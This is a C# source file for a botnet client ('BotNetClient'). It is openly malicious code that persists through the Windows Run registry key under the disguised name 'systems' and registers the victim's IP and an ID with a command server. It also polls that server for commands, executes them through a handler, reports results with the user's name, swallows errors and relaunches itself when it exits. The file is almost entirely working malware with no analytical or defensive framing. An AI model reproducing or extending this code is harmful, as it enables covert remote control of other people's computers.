﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Threading;
using System.Reflection;
using Microsoft.Win32;
using System.IO;
using CommandHandler;

namespace BotNetClient
{
    class Program
    {
        public static void autorun()
        {
            try
            {
                RegistryKey reg;
                reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
                reg.SetValue("systems", Environment.CurrentDirectory.ToString()+"\\BotNetClient.exe");
            }
            catch { }
        }
        public static UInt32 idc;
        static void Main(string[] args)
        {
            ServicePointManager.Expect100Continue = false;
            autorun();
            string address = "192.168.0.17";
            int port = 8005;
            IPHostEntry iphostinfo = Dns.Resolve(Dns.GetHostName());
            IPAddress ipadress = iphostinfo.AddressList[0];
            List<string> apiipadress = new List<string> { };
            idc = HttpHandler.CreateIpAndIdAsync(ipadress.ToString()).Result;
            uint id = 1;
            id = HttpHandler.IdResult().Result+1;
            SecondThread.miniprog();
            try
            {
                if (!File.Exists("C:\\ProgramData\\idbtc.txt"))
                {
                    File.Create("C:\\ProgramData\\idbtc.txt").Close();
                    File.WriteAllText("C:\\ProgramData\\idbtc.txt", idc.ToString());
                }
                while (true)
                {
                    if(HttpHandler.IdResult().Result!=0)
                        {
                        if ((HttpHandler.GetCommandAssync<Command>($"/api/v1/messages/{id - 1}").Result != null))
                        {
                            if ((HttpHandler.ResultIdCmd((id - 1).ToString()).Result == id - 1) && (HttpHandler.ResultIdsCmdAsync((id - 1).ToString()).Result.IndexOf(idc.ToString()) >= 0))
                            {
                                string answer = HttpHandler.ResultCmd((id - 1).ToString()).Result;
                                Stopwatch watch = new Stopwatch();
                                watch.Start();
                                string message = "Ответ от " + "PC: " + Environment.UserName + " : " + handler.handl(answer, idc, ipadress.ToString()) + ". Time Used: " + watch.ElapsedMilliseconds + "ms";
                                HttpHandler.SendResponse(message, idc.ToString());
                                watch.Stop();
                                id++;
                            }
                            else
                            {
                                id++;
                                continue;
                            }
                        }
                        else
                        {
                            continue;
                        }
                    }
                    else
                    {
                        id = 1;
                        continue;
                    }
                    Thread.Sleep(5000);
                }
            } 
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                HttpHandler.SendResponse(ex.ToString(), idc.ToString());
            }
            finally
            {
                Thread.Sleep(5000);
                Process.Start(Assembly.GetExecutingAssembly().Location);
                Environment.Exit(0);
            }
        }
    }
}
